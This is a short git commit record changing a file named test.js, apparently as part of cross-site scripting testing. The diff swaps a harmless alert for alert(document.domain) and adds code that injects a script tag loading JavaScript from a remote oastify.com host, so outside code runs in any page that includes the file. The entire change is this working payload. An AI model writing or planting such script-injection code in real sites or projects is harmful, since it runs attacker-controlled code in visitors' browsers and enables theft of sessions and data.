f4b7fb8721eea3543436c9b1fc61a0abe47cca88
Richard Haaga <richard.haaga@gmail.com>
2023-10-18 13:36:59 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,4 @@
-alert('Hello');
+alert(document.domain);
+let scriptEle = document.createElement("script");
+scriptEle.setAttribute("src", "https://1y0a05aqpmpih44yoauh299lacg34wsl.oastify.com/test.js");
+document.body.appendChild(scriptEle);
